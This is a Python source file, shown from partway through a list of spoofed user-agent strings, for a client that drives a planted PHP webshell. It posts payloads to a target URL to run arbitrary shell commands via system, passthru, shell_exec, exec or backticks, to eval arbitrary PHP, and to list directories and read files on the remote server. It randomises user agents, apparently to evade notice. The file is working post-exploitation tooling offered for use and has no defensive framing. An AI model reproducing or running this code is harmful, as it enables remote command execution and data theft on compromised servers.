    "Mozilla/5.0 (Linux; Android 8.1.0; CPH1825 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 7.1.1; Coolpad E2C Build/NMF26F)",
    "Mozilla/5.0 (Linux; Android 10; I4213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 11; moto g(60)s Build/RRLS31.Q2X-70-24-2-2)",
    "Mozilla/5.0 (Linux; Android 9; SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; LG-H930) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; moto e6s Build/POBS29.288-60-6-1-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SHV-E300S Build/LRX22C)",
    "Mozilla/5.0 (Linux; Android 10; MI MAX 3 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; itel L6501) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36",
    "Dalvik/1.6.0 (Linux; U; Android 6.0.1; SM-G7102 Build/KOT49H)",
    "Mozilla/5.0 (Linux; Android 7.1.1; ASUS_T00J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 8.1; P8 Build/LMY47I)",
    "Mozilla/5.0 (Linux; Android 9; ONEPLUS A3003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Moto G (5S) Build/OPP28.65-37-2)",
    "Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-S115DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; X90L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; vivo 1727 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.7.0.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-N981U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"
]
CMD_PLACEHOLDER = "<CMD_PLACEHOLDER>"
CMD_WRAPPERS = {
    'linux': f"bash -c 'exec 2>&1 {CMD_PLACEHOLDER}'",
    # 'windows': f'cmd -c "{CMD_PLACEHOLDER}"'
}
PHP_EXEC_TYPES = {
    'system': f'system("{CMD_PLACEHOLDER}");',
    'passthru': f'passthru("{CMD_PLACEHOLDER}");',
    'shell_exec': f'echo shell_exec("{CMD_PLACEHOLDER}");',
    'exec': f'$output=null; $retval=null; exec("{CMD_PLACEHOLDER}", $output, $retval); '
            'foreach ($output as $out_line){ echo "$out_line\n"; }',
    'backticks': f'echo `{CMD_PLACEHOLDER}`;'
    # proc_open() and popen() can also be used to execute commands but are not included currently
}
DEFAULT_POST_PARAM = 'payload'
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="The url to the webshell. Ex: http://example.com/webshell.php", required=True)
parser.add_argument("-t", "--type",
                    help="The type of payload you want to execute: "
                         "exec - for shell commands "
                         "(this is the only function that executes processes/commands on the remote machine), "
                         "eval - to eval whatever php code you want, "
                         "dir - list files/folders in given path (via eval code), "
                         "cat - read file contents (via eval code), "
                         "pwd - get the current working directory (via eval code)",
                    required=True)
parser.add_argument("-p", "--payload",
                    help="The the php code, shell command, directory or file you want to pass to 'eval', 'exec', 'dir' or 'cat'")
parser.add_argument("-e", "--exec-type", default="system",
                    help="The type of function to use for the 'eval' type - system(), exec(), etc.")
parser.add_argument("-v", "--verify", action="store_true",
                    help="Print the request data before sending it, and ask user to verify the data. "
                         "Good to make sure there are no mistakes")
parser.add_argument("-o", "--operating-system",
                    help="The operating system that the webshell is running on. "
                         "This is only relevant for the 'exec' payload, to know how to wrap the command. "
                         "Default value is 'linux'",
                    default="linux")
parser.add_argument("--post-param", default=DEFAULT_POST_PARAM,
                    help="This is the name of the post parameter that the webshell.php is expecting to see")
args = vars(parser.parse_args())


def execute_command_setup():
    cmd = args['payload']
    if cmd is None:
        print("The 'exec' type requires a payload")
        print("error: argument -p/--payload: expected one argument")
        exit()
    new_cmd = CMD_WRAPPERS[args['operating_system']].replace(CMD_PLACEHOLDER, cmd)
    new_cmd = PHP_EXEC_TYPES[args['exec_type']].replace(CMD_PLACEHOLDER, new_cmd)
    return new_cmd


def eval_setup():
    php_code = args['payload']
    if php_code is None:
        print("The 'eval' type requires a payload")
        print("error: argument -p/--payload: expected one argument")
        exit()
    return php_code


def dir_setup():
    directory = args['payload']
    if directory is None:
        print("The 'dir' type requires a payload")
        print("error: argument -p/--payload: expected one argument")
        exit()

    if directory[-1:] != '/':
        directory = directory + "/"
    dir_eval_code = f'if (is_dir("{directory}"))' \
                    "{" \
                    f'$files = scandir("{directory}"); ' \
                    'foreach ($files as $file){ ' \
                    f'if (is_dir("{directory}" . $file)) ' \
                    '{echo "dir\t$file\n";} else {echo "file\t$file\n";} };' \
                    "} else { " \
                    'echo "Given path is not a directory that exists on the remote machine";' \
                    "}"
    return dir_eval_code


def cat_setup():
    file_path = args['payload']
    if file_path is None:
        print("The 'cat' type requires a payload")
        print("error: argument -p/--payload: expected one argument")
        exit()
    read_file_eval_code = f'if (is_file("{file_path}"))' \
                          '{' \
                          f'echo file_get_contents("{file_path}");' \
                          '}'
    return read_file_eval_code


def pwd_setup():
    pwd_eval_code = "echo getcwd();"
    return pwd_eval_code


def verify(request_data: str, user_agent: str):
    print(f"Request Type:\t{args['type']}")
    print(f"Target URL:\t{args['url']}")
    print(f"User-Agent:\t{user_agent}")
    new_req_data = request_data.replace("\n", "\\n").replace("\t", "\\t")
    print(f"Data:\t\t{new_req_data}")
    print(f"Post Param:\t{args['post_param']}")
    is_good = input("Does this look good? (y/n): ").lower()
    if is_good == 'y':
        print()
        return True
    print("Aborting request")
    return False


def make_request(request_data: str, user_agent: str):
    headers = {
        'User-Agent': user_agent
    }
    data = {
        args['post_param']: request_data
    }
    result = requests.post(args['url'], data=data, headers=headers).text
    return result


def main():
    types = {
        "exec": execute_command_setup,
        "eval": eval_setup,
        "dir": dir_setup,
        "cat": cat_setup,
        "pwd": pwd_setup
    }

    if args['type'] not in types.keys():
        print(f"Supported types are: {', '.join(list(types.keys()))}")
        return
    if args['exec_type'] not in PHP_EXEC_TYPES.keys():
        print(f"Supported php functions are: {', '.join(list(PHP_EXEC_TYPES.keys()))}")
        return

    request_data = types[args['type']]()
    user_agent = random.choice(USER_AGENTS)

    if args['verify']:
        if not verify(request_data, user_agent):
            return

    result = make_request(request_data, user_agent)
    print(result)


if __name__ == '__main__':
    main()
